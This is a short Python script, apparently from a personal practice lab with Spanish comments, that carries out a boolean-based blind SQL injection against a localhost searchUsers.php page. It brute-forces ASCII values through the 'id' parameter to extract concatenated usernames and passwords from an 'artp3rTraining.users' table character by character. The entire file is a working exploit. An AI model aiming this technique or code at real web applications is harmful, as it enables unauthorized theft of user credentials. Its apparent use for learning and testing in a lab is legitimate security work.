#!/usr/bin/python3

import requests
import signal
import sys
import time
import string
from pwn import *

def def_handler(sig, frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

# Variables globales
main_url = "http://localhost/searchUsers.php"
characters = string.printable

def makeSQLi():
    progre1 = log.progress("Fuerza bruta")
    progre1.status("Iniciando fuzzing...")
    time.sleep(3)
    progre2 = log.progress("Datos extra√≠dos")
    extracted_info = ""


    for position in range(1,150): # bucle principal
        encontrado=False
        for character in range(33,126): # rango obtenido con man ascii
            #sqli_url = main_url + "?id=9 or (select(select ascii(substring(username,%d,1)) from artp3rTraining.users where id = 1)=%d)" % (position, character)
            sqli_url = main_url + "?id=9 or (select(select ascii(substring((select group_concat(username,0x3a,password) from artp3rTraining.users),%d,1)) from artp3rTraining.users where id = 1)=%d)" % (position, character)
            req = requests.get(sqli_url)

            if req.status_code == 200:
                extracted_info += chr(character)
                progre2.status(extracted_info)
                encontrado=True
                break
        if encontrado == False:
            print("\n\n[!] Saliendo...\n")
            sys.exit(1)


if __name__ == '__main__':
	makeSQLi()
